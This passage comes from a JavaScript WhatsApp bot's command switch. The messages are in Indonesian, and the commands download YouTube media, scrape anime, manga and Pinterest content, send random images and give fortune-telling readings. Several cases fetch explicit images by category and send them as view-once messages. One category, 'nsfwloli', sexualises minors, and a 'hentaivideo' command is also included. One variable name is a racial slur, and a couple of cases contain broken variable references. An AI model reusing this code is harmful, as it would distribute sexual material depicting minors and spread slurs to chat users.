                let quality = args[1] ? args[1] : '128kbps'
                let media = await yta(urls[text - 1], quality)
                if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
                hisoka.sendImage(m.chat, media.thumb, `⭔ Title : ${media.title}\n⭔ File Size : ${media.filesizeF}\n⭔ Url : ${urls[text - 1]}\n⭔ Ext : MP3\n⭔ Resolusi : ${args[1] || '128kbps'}`, m)
                hisoka.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: 'audio/mpeg', fileName: `${media.title}.mp3` }, { quoted: m })
            }
            break
            case prefix+'getvideo': {
                let { ytv } = require('./lib/y2mate')
                if (!text) throw `Example : ${prefix + command} 1`
                if (!m.quoted) return m.reply('Reply Pesan')
                if (!m.quoted.isBaileys) throw `Hanya Bisa Membalas Pesan Dari Bot`
                let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
                if (!urls) throw `Mungkin pesan yang anda reply tidak mengandung result ytsearch`
                let quality = args[1] ? args[1] : '360p'
                let media = await ytv(urls[text - 1], quality)
                if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
                hisoka.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `⭔ Title : ${media.title}\n⭔ File Size : ${media.filesizeF}\n⭔ Url : ${urls[text - 1]}\n⭔ Ext : MP3\n⭔ Resolusi : ${args[1] || '360p'}` }, { quoted: m })
            }
            break
            case prefix+'pinterest': {
                                 hisoka.sendMessage(m.chat, waitv2, { quoted: m })

                 let { pinterest } = require('./lib/scraper')
                 anu = await pinterest(text)
                 result = anu[Math.floor(Math.random() * anu.length)]
                 let buttons = [ {buttonId: `.pinterest ${text}`, buttonText: {displayText: 'Lagi'}, type: 1}  ]                
                 let buttonMessage = {
                 document: { url: result },
                 mimetype: 'image/jpeg',
                 fileName: `${result}.jpg`,
                 caption: `Jika Suka dengan Gambarnya Anda Bisa mendownload File Di atas`,
                 footer: `By Lui`,
                 contextInfo: { mentionedJid: [m.sender],
                 externalAdReply: {
                 title: `Preview Hasil Dari pencarian ${text}`,
                 mediaType: 1,                        
                 thumbnail: await getBuffer(result),
                 renderLargerThumbnail: true,                                             
                 sourceUrl: ``, 
                 mediaUrl: result
                 }
                 },               
                 buttons: buttons,
                 headerType: 4
                 }
                 hisoka.sendMessage(m.chat, waitv2, { quoted: m })
                 hisoka.sendMessage(m.chat, buttonMessage, { quoted: m })
                 }
            break
           case 'waifu2': case 'shota': case 'yotsuba': case 'shinomiya': case 'yumeko': case 'tejina': case 'chiho': case 'boruto': case 'kaori': case 'shizuka': case 'kaga': case 'kotori': case 'mikasa': case 'akiyama': case 'gremory': case 'isuzu': case 'shina': case 'kagura': case 'shinka': case 'eba': case 'elaina': case 'erza': case 'hinata': case 'minato': case 'naruto': case 'sagiri': case 'nezuko': case 'rize': case 'ana': case 'deidara': case 'yuki': case 'asuna': case 'ayuzawa': case 'chitoge': case 'emilia': case 'hestia': case 'inori': case 'itachi': case 'madara': case 'sakura': case 'sasuke': case 'tsunade': case 'onepiece': case 'mobil': case 'montor': case 'keneki': case 'toukachan': case 'akira': case 'itori': case 'kurumi': case 'loli': case 'pokemon': {
                hisoka.sendMessage(m.chat, waitv2, { quoted: m })
           let res = await fetchJson(`https://raw.githubusercontent.com/Luigmntng/RESTAPI/master/data/${command}.json`)
           let anjime = res[Math.floor(Math.random() * res.length)]
           hisoka.sendMessage(m.chat, { image: { url: anjime }, caption: `Result From Random ${command}` }, { quoted: m })
  }
  break
  case prefix+'ssweb2': {
  if (!text) throw `masukan Link nya!\nContoh: ${prefix}ssweb https://google.com`
  let ss = await scrape.ssweb2(text)
  hisoka.sendMessage(m.chat, waitv2, { quoted: m })
  hisoka.sendMessage(m.chat, { image: ss.result, caption: `${text}` }, fgif)
  }
  break  
  case prefix+'ssweb': {
  if (!text) throw `masukan Link nya!\nContoh: ${prefix}ssweb https://google.com`
  let ss = await scrape.ssweb(text)
  hisoka.sendMessage(m.chat, waitv2, { quoted: m })
  hisoka.sendMessage(m.chat, { image: ss.result, caption: `${text}` }, fgif)
  }
  break
  case prefix+'imagegetter': {
  if (!text) throw `masukan link imagenya!`
                  hisoka.sendMessage(m.chat, waitv2, { quoted: m })
    hisoka.sendMessage(m.chat, { image: text, caption: `` }, fgif)
}
break
  case prefix+'nulis': {
if (!text) throw `Masukan Text nya!`
hisoka.sendMessage(m.chat, waitv2, { quoted: m })
let util = require('util')
let path = require('path')
let { spawn } = require('child_process')

// Font By MFarelS:V
let fontPath = 'lib/font/Zahraaa.ttf'
  let inputPath = 'lib/kertas/magernulis1.jpg'
  let d = new Date
  let tgl = d.toLocaleDateString('id-Id')
  let hari = d.toLocaleDateString('id-Id', { weekday: 'long' })
  let teks = args.join` `
  // hisoka.reply(m.chat, util.format({fontPath, inputPath, outputPath, tgl, hari, teks}), m)
  let bufs = []
  const [_spawnprocess, ..._spawnargs] = [
    'convert',
    inputPath,
    '-font',
    fontPath,
    '-size',
    '1024x784',
    '-pointsize',
    '20',
    '-interline-spacing',
    '1',
    '-annotate',
    '+806+78',
    hari,
    '-font',
    fontPath,
    '-size',
    '1024x784',
    '-pointsize',
    '18',
    '-interline-spacing',
    '1',
    '-annotate',
    '+806+102',
    tgl,
    '-font',
    fontPath,
    '-size',
    '1024x784',
    '-pointsize',
    '20',
    '-interline-spacing',
    '-7.5',
    '-annotate',
    '+344+142',
    teks,
    'jpg:-'
  ]
  spawn(_spawnprocess, _spawnargs)
    .on('error', e => m.reply(util.format(e)))
    .on('close', () => {
      hisoka.sendMessage(m.chat, { image: Buffer.concat(bufs), caption: `nih` }, { quoted: fgclink })
    })
    .stdout.on('data', chunk => bufs.push(chunk))
}
  break
    case prefix+'nulisfolio': {
  if (!text) throw `Masukan Text nya!`
  let cuaks = `https://hadi-api.herokuapp.com/api/canvas/nulis2?text=${text}`
                hisoka.sendMessage(m.chat, waitv2, { quoted: m })
             hisoka.sendMessage(m.chat, { image: { url: cuaks }, caption: `Success!!` }, { quoted: m })
  }
  break
            case prefix+'waifu': {
              m.reply('tunggu....')
              let res = await fetchJson('https://api.waifu.pics/sfw/waifu')
              hisoka.sendMessage(m.chat, { image: { url: res.url }, caption: `Nih!` }, { quoted: m })
             }
             break
             case prefix+'husbu': {
               m.reply('tunggu....')
               let tits = 'https://api.zacros.my.id/randomimg/husbu'
               hisoka.sendMessage(m.chat, { image: { url: tits }, caption: `Nih!` }, { quoted: m })
                }
             break
//by AsuKidal

case prefix+'hentaivideo': case prefix+'hentaimp4': {
  let su = await scrape.hentai()
  let bilek = su[Math.floor(Math.random() * su.length)]
  hisoka.sendMessage(m.chat, {
            video: { url: bilek.video_2 },
            caption: `Title : ${bilek.title}\nDitonton : ${bilek.views_count}`, 
            buttons: [{buttonId: `${prefix}hentaivideo`, buttonText: { displayText: "Lainnya" }, type: 1 }],
            footer: `${bilek.link}`
            }, { quoted: m })  
}
break
case prefix+'chara': {
   if (!text) throw 'Masukan Nama Wibu nya !'
   let satir = await aliya.character(text)
   let psatir = satir[Math.floor(Math.random() * satir.length)]
     hisoka.sendMessage(m.chat, {
            image: { url: psatir.thumbnail },
            caption: `Char name : ${psatir.character}\n${psatir.link}`, 
            buttons: [{buttonId: `${prefix}chara ${text}`, buttonText: { displayText: "Bukan ini" }, type: 1 }],
            footer: `Bukan ini Yang Kamu Maksud ? Klik Button di.bawah untuk result lainnya`
            }, { quoted: m })  
}
break
case prefix+'manga': {
if (!text) throw 'Masukan Judul nya!'
  let satir = await aliya.manga(text)
  let psatir = satir[Math.floor(Math.random() * satir.length)]
     hisoka.sendMessage(m.chat, {
            image: { url: psatir.thumbnail },
            caption: `Judul : ${psatir.judul}\n${psatir.link}`, 
            buttons: [{buttonId: `${prefix}manga ${text}`, buttonText: { displayText: "Bukan ini" }, type: 1 }],
            footer: `Bukan ini Yang Kamu Maksud ? Klik Button di.bawah untuk result lainnya`
            }, { quoted: m })  
}
break
case prefix+'animeinfo': {
if (!text) throw 'Masukan Judul nya!'
  let satire = await aliya.anime(text)
  let psatir = satir[Math.floor(Math.random() * satir.length)]
     hisoka.sendMessage(m.chat, {
            image: { url: psatir.thumbnail },
            caption: `Judul : ${psatir.judul}\n${psatir.link}`, 
            buttons: [{buttonId: `${prefix}animeinfo ${text}`, buttonText: { displayText: "Bukan ini" }, type: 1 }],
            footer: `Bukan ini Yang Kamu Maksud ? Klik Button di.bawah untuk result lainnya`
            }, { quoted: m })  
}
break
case prefix+'gitclone': {
    if (!text) throw 'link githubnya mana? contoh: https://github.com/LuiXyz/Hisoka-Morou'
    let regex = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    let [, user, repo] = text.match(regex) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    // 'attachment; filename=Kangsad01/bot-mdv1.21.4.2022-g836cccd.zip'
    m.reply(`*Mohon tunggu, sedang mengirim repository..*`)
    hisoka.sendMessage(m.chat, { document: { url: `${url}` },
                 mimetype: 'application/zip',
                 fileName: `${text}.zip` }, { quoted: m})
                 }
break
case prefix+'mangatoons': {
  if (!text) throw 'Masukan Judul Manga Atau Manhwa Nya!'
  let su = await scrape.mangatoons(text)
  let bilek = su[Math.floor(Math.random() * su.length)]
  hisoka.sendMessage(m.chat, { text: `Title : ${bilek.judul}\nGenre : ${bilek.genre}\n\n${bilek.link}`, 
   contextInfo: {   
            externalAdReply :{
    mediaUrl: `${bilek.thumbnail}`,
    renderLargerThumbnail: true,
    mediaType: 1,
    description: `Ok` , 
    title: `${bilek.judul}`,
    body: ``,
    thumbnail: await getBuffer(bilek.thumbnail),
    sourceUrl: `${bilek.link}`
     }}
  }, { quoted: m })  
}
break
//by AsuKidal
case prefix+'kiryu': {
  if (!text) throw 'Masukan Judul Manga Atau Manhwa Nya!'
   let su = await expar.anime.kiryu(text)
  let bilek = su[Math.floor(Math.random() * su.length)]
    hisoka.sendMessage(m.chat, { text: `Title: ${bilek.judul}\nStatus: ${bilek.manga_status}\nLast Chapter: ${bilek.last_chapter}\nRating: ${bilek.ranting}`,
   contextInfo: {   
            externalAdReply :{
    mediaUrl: `${bilek.thumbnail}`,
    renderLargerThumbnail: true,
    mediaType: 1,
    description: `Ok` , 
    title: `${bilek.judul}`,
    body: ``,
    thumbnail: await getBuffer(bilek.thumbnail),
    sourceUrl: `${bilek.link}`
     }}
  }, { quoted: m })
}
break
case prefix+'webtoons': {
  if (!text) throw 'Masukan Judul Manga Atau Manhwa Nya!'
  let su = await scrape.webtoons(text)
  let bilek = su[Math.floor(Math.random() * su.length)]
  hisoka.sendMessage(m.chat, { text: `Title : ${bilek.judul}\nJumlah Disukai : ${bilek.like}\nGenre : ${bilek.genre}\nLink Url : ${bilek.url}`,
   contextInfo: {   
            externalAdReply :{
    mediaUrl: `${bilek.thumbnail}`,
    renderLargerThumbnail: true,
    mediaType: 1,
    description: `Ok` , 
    title: `${bilek.judul} - Create By ${bilek.author}`,
    body: ``,
    thumbnail: await getBuffer(bilek.thumbnail),
    sourceUrl: `${bilek.url}`
     }}
  }, { quoted: m })
}
break
//by AsuKidal
case prefix+'otakudesuongoing': {
let cok = await expar.anime.otakudesuongoing()
let ceng = cok[Math.floor(Math.random() * cok.length)]
                for (let i of cok) {
nigga.push({
title: `${i.judul}`, rowId: `${prefix}otakudesu ${i.judul}`, description: `Update! ${i.episode}`})
                }
const sections = [
{
title: "Simple whatsapp Bot!",
rows: nigga
}
]
const listMessage = {
text: `List Update an Pada Hari ${ceng.hari} ${ceng.tanggal}`,
footer: `Simple whatsapp Bot`,
title: "",
buttonText: "List Search",
sections
}
hisoka.sendMessage(m.chat, listMessage, {quoted:m})
  }
  break
case prefix+'kusonime': {
    if (!text) throw '_Ingin Cari Apa_'
                hisoka.sendMessage(m.chat, waitv2, { quoted: m })
  let json = await fetchJson('https://ardhixsquerpants.herokuapp.com/api/kuso?q=' + encodeURIComponent(text))
  const raku =  `*JUDUL :* "${json.title}"\n\n*info:* ${json.info}\n\n*SINOPSIS :* ${json.sinopsis}\n\n*LINK DOWNLOADS:* ${json.link_dl}`
     hisoka.sendMessage(m.chat, { text: raku, contextInfo: {   
            externalAdReply :{
    mediaUrl: `${json.thumb}`,
    renderLargerThumbnail: true,
    mediaType: 1,
    description: `Ok` , 
    title: `${json.title}`,
    body: `Clik disini untuk langsung Ke web nya!`,
    thumbnail: await getBuffer(json.thumb),
    sourceUrl: ``
     }}
  }, { quoted: m })
}
break
case prefix+'otakudesu': {
 if (!text) throw 'Masukan Judul anime nya !'
  let res = await scrape.otakudesu(text)
  let json = await yuzzu.otaku(text)
 hisoka.sendMessage(m.chat, { text: `${json.result.judul}\n${json.result.produser}\n${json.result.studio}\n${json.result.rating}\n${json.result.status}\n${json.result.rilis}`,
 contextInfo: {   
            externalAdReply :{
    mediaUrl: `${res[0].link}`,
    renderLargerThumbnail: true,
    mediaType: 1,
    description: `Ok` , 
    title: `${res[0].judul}`,
    body: `Clik disini untuk langsung Ke web nya!`,
    thumbnail: await getBuffer(json.result.thumb),
    sourceUrl: `${res[0].link}`
     }}
  }, { quoted: m })
      }
      break
      case 'ass': case 'bdsm': case 'blowjob': case 'boobjob': case 'cum': case 'creampie': case 'cuckold': case 'ero': case 'elves': case 'femdom': case 'gangbang': case 'glasses': case 'hentai': case 'incest': case 'masturbation': case 'pantsu': case 'orgy': case 'tentacles': case 'thighs': case 'uniform': case 'yuri': {
                hisoka.sendMessage(m.chat, waitv2, { quoted: m })
               let res = await fetchJson(`https://hmtai.herokuapp.com/nsfw/${command}`)
               hisoka.sendMessage(m.chat, { image: { url: res.url }, caption: `Nih!`, viewOnce: true }, { quoted: m })               
                   }
                   break              
      case 'ahegao': case 'pussy': case 'nsfwloli': case 'zettai': case 'foot': {
                hisoka.sendMessage(m.chat, waitv2, { quoted: m })
      let ris = await fetchJson(`https://raw.githubusercontent.com/Luigmntng/RESTAPI/master/data/${command}.json`)
      let cuk = pickRandom(ris)
                     hisoka.sendMessage(m.chat, { image: { url: cuk }, caption: `Nih!`, viewOnce: true }, { quoted: m })               
                   }
                   break              
    	case 'cry': case 'kill': case 'hug': case 'pat': case 'lick': case 'kiss': case 'bite': case 'yeet': case 'neko': case 'bully': case 'bonk': case 'wink': case 'poke': case 'nom': case 'slap': case 'waifu': case 'smile': case 'wave': case 'awoo': case 'blush': case 'smug': case 'glomp': case 'happy': case 'dance': case 'cringe': case 'cuddle': case 'highfive': case 'shinobu': case 'megumin': case 'handhold': {
					m.reply('Tunggu....')
					let res = await fetchJson(`https://api.waifu.pics/sfw/${command}`)
                    hisoka.sendVideoAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author })
                    }
					break
	  case prefix+'cp': case prefix+'ppcp': case prefix+'ppcouple': {
                                hisoka.sendMessage(m.chat, waitv2, { quoted: m })

                let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
                let random = anu[Math.floor(Math.random() * anu.length)]
                hisoka.sendMessage(m.chat, { image: { url: random.male }, caption: `Couple Male` }, { quoted: m })
                hisoka.sendMessage(m.chat, { image: { url: random.female }, caption: `Couple Female` }, { quoted: m })
            }
	    break
	    case prefix+'kisahnabi': {
	             let judul = 'Hi '
      const sections = [
      {
        title: 'By AhmdLui 🥶🥶️',
        rows: [
          { title: 'Nabi Adam AS', rowId: `adam` },
          { title: 'Nabi Idris AS', rowId: `iddris` },
          { title: 'Nabi Nuh AS', rowId: `nuh` },
          { title: 'Nabi Hud AS', rowId: `hud` },
          { title: 'Nabi Shaleh AS', rowId: `shaleh` },
          { title: 'Nabi Ibrahim AS', rowId: `ibrahim` },
          { title: 'Nabi Luth AS', rowId: `luth` },
          { title: 'Nabi Ismail AS', rowId: `ismail` },
          { title: 'Nabi Ishaq AS', rowId: `ishaq` },
          { title: 'Nabi Ya\'qub AS', rowId: `yaqub` },
          { title: 'Nabi Yusuf AS', rowId: `yusuf` },
          { title: 'Nabi Ayyub AS', rowId: `ayyub` },
          { title: 'Nabi Syuaib AS', rowId: `syuaib` },
          { title: 'Nabi Musa AS', rowId: `musa` },
          { title: 'Nabi Harun AS', rowId: `harun` },
          { title: 'Nabi Dzulkifli AS', rowId: `dzulkifli` },
          { title: 'Nabi Daud AS', rowId: `daud` },
          { title: 'Nabi Sulaiman AS', rowId: `sulaiman` },
          { title: 'Nabi Ilyas AS', rowId: `ilyas` },
          { title: 'Nabi Ilyasa AS', rowId: `ilyasa` },
          { title: 'Nabi Yunus AS', rowId: `yunus` },
          { title: 'Nabi Dzakaria AS', rowId: `dzakaria` },
          { title: 'Nabi Yahya AS', rowId: `yahya` },
          { title: 'Nabi Isa AS', rowId: `isa` },
          { title: 'Nabi muhammad SAW', rowId: `muhammad` },
                    
        ]
}
    ]
    const listMessage = {
      text: `
Nih!!?! Kisah nya`,
      footer: `Bilek 😅👆`,
      title: ``,
      buttonText: "Klik here",
      sections
    }
    hisoka.sendMessage(m.chat, listMessage, { quoted: fkontak, mentions: await hisoka.parseMention(judul), contextInfo: { forwardingScore: 99999, isForwarded: true }})

}
break
	    case 'adam': case 'idris': case 'nuh': case 'hud': case 'shaleh': case 'ibrahim': case 'luth': case 'ismail': case 'ishaq': case 'yaqub': case 'yusuf': case 'ayyub': case 'syuaib': case 'musa': case 'harun': case 'dzulkifli': case 'daud': case 'sulaiman': case 'ilyas': case 'ilyasa': case 'yunus': case 'dzakaria': case 'yahya': case 'isa': case 'muhammad': {
    let json = await fetchJson(`https://raw.githubusercontent.com/Luigmntng/RESTAPI/master/data/kisahNabi/${command}.json`)   
    hisoka.sendButtonImg(m.chat, json.image_url, `Nama Nabi : ${json.name}\nTahun Kelahiran : ${json.thn_kelahiran}\nUsia : ${json.usia}\nTempat : ${json.tmp}\nCerita : ${json.description}`, wm, `Subhanallah`, `ok`, m)
}
break
            case prefix+'coffe': case prefix+'kopi': {
            let buttons = [
                    {buttonId: `coffe`, buttonText: {displayText: 'Next Image'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: 'https://coffee.alexflipnote.dev/random' },
                    caption: `☕ Random Coffe`,
                    footer: hisoka.user.name,
                    buttons: buttons,
                    headerType: 4
                }
                hisoka.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case prefix+'wallpaper': {
                if (!text) throw 'Masukkan Query Title'
	      	let psatir = await aliya.wallpaper(text)
                satir = psatir[Math.floor(Math.random() * psatir.length)]
		let buttons = [
                    {buttonId: `wallpaper ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: satir.image },
                    caption: `Image Type: ${satir.type}`,
                    footer: `By Lui`,
                    buttons: buttons,
                    headerType: 4
                }
                hisoka.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case prefix+'wikimedia': {
                if (!text) throw 'Masukkan Query Title'
		let { wikimedia } = require('./lib/scraper')
                anu = await wikimedia(text)
                result = anu[Math.floor(Math.random() * anu.length)]
                let buttons = [
                    {buttonId: `wikimedia ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result.image },
                    caption: `⭔ Title : ${result.title}\n⭔ Source : ${result.source}\n⭔ Media Url : ${result.image}`,
                    footer: hisoka.user.name,
                    buttons: buttons,
                    headerType: 4
                }
                hisoka.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case prefix+'quotesanime': case prefix+'quoteanime': {
		let { quotesAnime } = require('./lib/scraper')
                let anu = await quotesAnime()
                result = anu[Math.floor(Math.random() * anu.length)]
                let buttons = [
                    {buttonId: `quotesanime`, buttonText: {displayText: 'Next'}, type: 1}
                ]
                let buttonMessage = {
                    text: `~_${result.quotes}_\n\nBy '${result.karakter}', ${result.anime}\n\n- ${result.up_at}`,
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 2
                }
                hisoka.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
	        case prefix+'motivasi': case prefix+'dilanquote': case prefix+'bucinquote': case prefix+'katasenja': case prefix+'puisi': {
                let anu = await fetchJson(api('zenz', '/api/'+command, {}, 'apikey'))
                let buttons = [
                    {buttonId: `motivasi`, buttonText: {displayText: 'Next'}, type: 1}
                ]
                let buttonMessage = {
                    text: anu.result.message,
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 2
                }
                hisoka.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case prefix+'3dchristmas': case prefix+'3ddeepsea': case prefix+'americanflag': case prefix+'3dscifi': case prefix+'3drainbow': case prefix+'3dwaterpipe': case prefix+'halloweenskeleton': case prefix+'sketch': case prefix+'bluecircuit': case prefix+'space': case prefix+'metallic': case prefix+'fiction': case prefix+'greenhorror': case prefix+'transformer': case prefix+'berry': case prefix+'thunder': case prefix+'magma': case prefix+'3dcrackedstone': case prefix+'3dneonlight': case prefix+'impressiveglitch': case prefix+'naturalleaves': case prefix+'fireworksparkle': case prefix+'matrix': case prefix+'dropwater':  case prefix+'harrypotter': case prefix+'foggywindow': case prefix+'neondevils': case prefix+'christmasholiday': case prefix+'3dgradient': case prefix+'blackpink': case prefix+'gluetext': {
                if (!text) throw `Example : ${prefix + command} text`
                                hisoka.sendMessage(m.chat, waitv2, { quoted: m })

                hisoka.sendMessage(m.chat, { image: { url: api('zenz', '/textpro/' + command, { text: text }, 'apikey') }, caption: `Text Pro ${command}` }, { quoted: m})
	    }
            break
	    case prefix+'shadow': case prefix+'romantic': case prefix+'smoke': case prefix+'burnpapper': case prefix+'naruto': case prefix+'lovemsg': case prefix+'grassmsg': case prefix+'lovetext': case prefix+'coffecup': case prefix+'butterfly': case prefix+'harrypotter': case prefix+'retrolol': {
                if (!text) throw 'No Query Text'
                                hisoka.sendMessage(m.chat, waitv2, { quoted: m })

                hisoka.sendMessage(m.chat, { image: { url: api('zenz', '/photooxy/' + command, { text: text }, 'apikey') }, caption: `Photo Oxy ${command}` }, { quoted: m })
            }
            break
            case prefix+'ffcover': case prefix+'crossfire': case prefix+'galaxy': case prefix+'glass': case prefix+'neon': case prefix+'beach': case prefix+'blackpink': case prefix+'igcertificate': case prefix+'ytcertificate': {
                if (!text) throw 'No Query Text'
                                hisoka.sendMessage(m.chat, waitv2, { quoted: m })

                hisoka.sendMessage(m.chat, { image: { url: api('zenz', '/ephoto/' + command, { text: text }, 'apikey') }, caption: `Ephoto ${command}` }, { quoted: m })
            }
            break
	    case prefix+'nomerhoki': case prefix+'nomorhoki': {
                if (!Number(text)) throw `Example : ${prefix + command} 6288292024190`
                let anu = await primbon.nomer_hoki(Number(text))
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `⭔ *Nomor HP :* ${anu.message.nomer_hp}\n⭔ *Angka Shuzi :* ${anu.message.angka_shuzi}\n⭔ *Energi Positif :*\n- Kekayaan : ${anu.message.energi_positif.kekayaan}\n- Kesehatan : ${anu.message.energi_positif.kesehatan}\n- Cinta : ${anu.message.energi_positif.cinta}\n- Kestabilan : ${anu.message.energi_positif.kestabilan}\n- Persentase : ${anu.message.energi_positif.persentase}\n⭔ *Energi Negatif :*\n- Perselisihan : ${anu.message.energi_negatif.perselisihan}\n- Kehilangan : ${anu.message.energi_negatif.kehilangan}\n- Malapetaka : ${anu.message.energi_negatif.malapetaka}\n- Kehancuran : ${anu.message.energi_negatif.kehancuran}\n- Persentase : ${anu.message.energi_negatif.persentase}`, m)
            }
            break
            case prefix+'artimimpi': case prefix+'tafsirmimpi': {
                if (!text) throw `Example : ${prefix + command} belanja`
                let anu = await primbon.tafsir_mimpi(text)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `⭔ *Mimpi :* ${anu.message.mimpi}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Solusi :* ${anu.message.solusi}`, m)
            }
            break
            case prefix+'ramalanjodoh': case prefix+'ramaljodoh': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case prefix+'ramalanjodohbali': case prefix+'ramaljodohbali': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_jodoh_bali(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case prefix+'suamiistri': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.suami_istri(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `⭔ *Nama Suami :* ${anu.message.suami.nama}\n⭔ *Lahir Suami :* ${anu.message.suami.tgl_lahir}\n⭔ *Nama Istri :* ${anu.message.istri.nama}\n⭔ *Lahir Istri :* ${anu.message.istri.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case prefix+'ramalancinta': case prefix+'ramalcinta': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_cinta(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Sisi Positif :* ${anu.message.sisi_positif}\n⭔ *Sisi Negatif :* ${anu.message.sisi_negatif}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case prefix+'artinama': {
                if (!text) throw `Example : ${prefix + command} Dika Ardianta`
                let anu = await primbon.arti_nama(text)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case prefix+'kecocokannama': case prefix+'cocoknama': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005`
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Life Path :* ${anu.message.life_path}\n⭔ *Destiny :* ${anu.message.destiny}\n⭔ *Destiny Desire :* ${anu.message.destiny_desire}\n⭔ *Personality :* ${anu.message.personality}\n⭔ *Persentase :* ${anu.message.persentase_kecocokan}`, m)
            }
            break
            case prefix+'kecocokanpasangan': case prefix+'cocokpasangan': case prefix+'pasangan': {
                if (!text) throw `Example : ${prefix + command} Dika|Novia`
                let [nama1, nama2] = text.split`|`
                let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendImage(m.chat,  anu.message.gambar, `⭔ *Nama Anda :* ${anu.message.nama_anda}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan}\n⭔ *Sisi Positif :* ${anu.message.sisi_positif}\n⭔ *Sisi Negatif :* ${anu.message.sisi_negatif}`, m)
            }
            break
            case prefix+'jadianpernikahan': case prefix+'jadiannikah': {
                if (!text) throw `Example : ${prefix + command} 6, 12, 2020`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `⭔ *Tanggal Pernikahan :* ${anu.message.tanggal}\n⭔ *karakteristik :* ${anu.message.karakteristik}`, m)
            }
            break
            case prefix+'sifatusaha': {
                if (!ext)throw `Example : ${prefix+ command} 28, 12, 2021`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
